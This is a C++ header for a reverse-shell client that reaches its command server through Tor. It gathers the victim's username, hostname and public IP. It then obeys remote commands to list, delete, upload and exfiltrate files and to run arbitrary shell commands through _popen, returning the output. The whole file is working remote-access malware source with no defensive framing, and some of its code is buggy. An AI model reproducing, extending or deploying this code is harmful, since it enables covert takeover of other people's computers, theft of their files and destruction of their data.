#pragma once

#include "TorPlusPlus/torplusplus.hpp"

#include <string>
#include <Windows.h>
#include <lmcons.h>
#include <filesystem>
#include <vector>
#include <iterator>
#include <fstream>

#pragma comment(lib, "Ws2_32.lib")
#include <WinSock2.h>


/*
    Contains code for connecting to the server and processing commands
*/
class torRevShellClient {
private:
    torPlusPlus::torSocketExtended torSock;
    std::string torPath;
    std::string servAddr;
    std::string publicIp;
    std::string username;
    std::string hostname;
    bool connected = false;

    // Has to be done using a normal socket, cant use tor for obvious reasons
    std::string getIP() {
        WSADATA wsaData = { 0 };
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        std::string url = "checkip.amazonaws.com";
        struct hostent* host = gethostbyname(url.c_str());
        struct sockaddr_in addr;
        addr.sin_addr.s_addr = *(u_long*)host->h_addr_list[0];
        addr.sin_family = AF_INET;
        addr.sin_port = htons(80);
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        std::string req = "GET / HTTP/1.1\r\nHost: " + url + "\r\n\r\n";
        send(sock, req.c_str(), req.length(), 0);
        char buffer[1024];
        int bytesReceived = recv(sock, buffer, 1024, 0);
        std::string response(buffer, bytesReceived-1); //-1 removes last newline
        closesocket(sock);
        WSACleanup();
        return response.substr(response.find_last_of('\n')+1);
    }

    /*
        Gets username + hostname.
        Will get public IP at some point in the future
    */
    void getComputerInfo() {
        // Get the username of the current user:
        TCHAR usernameTC[UNLEN + 1];
        DWORD usernameLen = UNLEN + 1;
        GetUserName(usernameTC, &usernameLen);
        std::wstring usernameWStr(&usernameTC[0]);
        this->username = std::string(usernameWStr.begin(), usernameWStr.end());
        // Get the computer hostname:
        TCHAR hostnameTC[UNLEN + 1];
        DWORD hostnameLen = UNLEN + 1; // Not sure if UNLEN+1 is actually the max length
        GetComputerName(hostnameTC, &hostnameLen);
        std::wstring hostnameWStr(&hostnameTC[0]);
        this->hostname = std::string(hostnameWStr.begin(), hostnameWStr.end());
        // Public IP filled with dummy data for now:
        this->publicIp = this->getIP();
        printf("PUBIP: %s\n", this->publicIp.c_str());
    }

    
public:

    /*
        Set up basic shits
    */
    torRevShellClient(std::string torPath, std::string servAddr){
        this->torPath = torPath;
        this->servAddr = servAddr;
        this->getComputerInfo();
    }

    /*
        Attempts to start TOR using this->torPath
        Returns 0 on fail
    */
    bool startProxy() {
        return this->torSock.startAndConnectToProxy(this->torPath.c_str());
    }

    /*
        Attempts to make a connection to the server
        Returns true if a successful response from server is received ("<ip>;<username>;<hostname>;connected;")
    */
    bool attemptConnect() {
        this->torSock.connectToProxy();
        printf("Attempting to connect to %s\n", this->servAddr.c_str());
        this->torSock.connectProxyTo(this->servAddr.c_str());
        std::string connReq = this->publicIp + ";" + this->username + ";" + this->hostname + ";";
        this->torSock.proxySend(connReq.c_str(), connReq.size());
        char connResponseBuff[1024] = { 0 }; // 1kb should be enough :)
        this->torSock.proxyRecv(connResponseBuff, 1024);
        printf("Received response: %s\n", connResponseBuff);
        std::string connResponse = connResponseBuff; // Convert to std::string for easier handling
        this->connected = (connResponse == this->publicIp + ";" + this->username + ";" + this->hostname + ";" + "connected;");
        return this->connected;
    }
    
    /*
        This is essentially the "main()" for the server.
        Only runs if this->connected is true.
    */
    void cmdProcessLoop() {
        if (!this->connected) {
            return;
        }
        while (1) {
            char cmdBuff[1024] = { 0 };
            int bytesReceived = this->torSock.proxyRecv(cmdBuff, 1024);
            if (bytesReceived <= 0) {
                return;
            }
            std::string cmd = cmdBuff; // Convert for easier handling
            printf("CMD: %s\n", cmd.c_str());
            if (cmd == "ping;") {
                torSock.proxySend("ping;pong;", 11);
            }
            else if (cmd == "pwd;") {
                this->pwd();
            }
            else if (cmd == "ls;") {
                this->ls();
            }
            else if (cmd.starts_with("rm")) {
                this->rm(cmd.substr(3, cmd.size() - 1));
            }
            else if (cmd.starts_with("cd;")) {
                this->cd(cmd.substr(3, cmd.size() - 1));
            }
            else if (cmd.starts_with("grab;")) {
                this->grab(cmd.substr(5, cmd.size() - 6));
            }
            else if (cmd.starts_with("upload;")) {
                this->upload(cmdBuff, bytesReceived); // Using raw buffer, because null bytes are a thing.
            }
            else if (cmd.starts_with("exec;")) {
                this->exec(cmd.substr(5, cmd.size() - 6));
            }
            else {
                std::string failResponse = "Received invalid command: " + cmd;
                torSock.proxySendStr(failResponse);
            }
        }
    }

    /*
        Command functions
        These are called by cmdProcessLoop()
    */

    void pwd() {
        // Get the current working directory
        TCHAR cwdTC[MAX_PATH] = { 0 };
        GetCurrentDirectory(MAX_PATH, cwdTC);
        std::wstring cwdWStr(&cwdTC[0]);
        std::string response = "pwd;" + std::string(cwdWStr.begin(), cwdWStr.end())+";";
        this->torSock.proxySendStr(response);
    }

    void ls() {
        // Get a list of the files and folders in the current directory
        std::string response = "ls;";
        for (const auto& entry : std::filesystem::directory_iterator(std::filesystem::current_path())) {
            response += entry.path().filename().string();
            if (entry.is_directory()) {
                response += "/";
            }
            response += ";";
        }
        this->torSock.proxySendStr(response);
    }

    void rm(std::string path) {
        this->torSock.proxySendStr("rm;" + (std::filesystem::remove(path)) ? "success" : "failed");
    }

    void cd(std::string path){
        std::wstring pathWStr(path.begin(), path.end() - 1);
        BOOL success = SetCurrentDirectory(pathWStr.c_str());
        std::string response = "cd;" + path + ((success) ? "success;" : "failed;");
        this->torSock.proxySendStr(response);
    }

    void grab(std::string path) {
        std::ifstream f(path.c_str(), std::ios::binary);
        if (f.is_open() != true) {
            this->torSock.proxySendStr("grab;" + path + ";0;ERR");
        }
        else {
            std::string responseStr = "grab;" + path + ";" + std::to_string(std::filesystem::file_size(path)) + ";";
            std::vector<char> responseBytes;
            responseBytes.reserve(responseStr.size() + std::filesystem::file_size(path));
            for (char c : responseStr) {
                responseBytes.push_back(c);
            }
            for (char c; f.get(c);) {
                responseBytes.push_back(c);
            }
            this->torSock.proxySend(responseBytes.data(), responseBytes.size());
        }
    }

    void upload(char* b, unsigned int bytesReceivedInitial) {
        unsigned bytesReceivedTotal = bytesReceivedInitial;
        // Convert the buffer to a string and extract the file name and size
        // upload;<file name>;<file size>;<raw data>
        std::string bStr(b);
        int fileNameEnd = bStr.find(";", 7);
        std::string fileName = bStr.substr(7, fileNameEnd - 7);
        unsigned long int fileSize = std::stoi(bStr.substr(fileNameEnd + 1, bStr.find(";", fileNameEnd + 1) - fileNameEnd - 1)); // unsafe
        unsigned int headerSize = 7 + fileName.size() + 1 + std::to_string(fileSize).size() + 1; // 7 = "upload;", 1 = ";", 1 = ";"
        bytesReceivedTotal -= headerSize;
        std::vector<char> fileData;
        fileData.reserve(fileSize);
        printf("Received upload for %d bytes of data, filename: %s\n", fileSize, fileName.c_str());
        fileData.insert(fileData.end(), b + headerSize, b + bytesReceivedInitial);
        while (bytesReceivedTotal < fileSize) {
            char b[1024] = { 0 };
            unsigned int bytesReceived = this->torSock.proxyRecv(b, 1024);
            fileData.insert(fileData.end(), b, b + bytesReceived);
            bytesReceivedTotal += bytesReceived;
        }
        std::ofstream f(fileName.c_str(), std::ios::binary);
        if (f.is_open() != true) {
            this->torSock.proxySendStr("upload;" + fileName + ";failed;");
        }
        else {
            f.write(fileData.data(), fileData.size());
            this->torSock.proxySendStr("upload;" + fileName + ";success;");
        }
        f.close();
    }

    void exec(std::string cmd) {
        // Execute a command and return the output
        std::string response = "exec;" + cmd + ";";
        FILE* pipe = _popen(cmd.c_str(), "r");
        if (!pipe) {
            response += "failed;";
        }
        else {
            char buffer[128];
            while (!feof(pipe)) {
                if (fgets(buffer, 128, pipe) != NULL) {
                    response += buffer;
                }
            }
            _pclose(pipe);
        }
        this->torSock.proxySendStr(response);
    }
    
};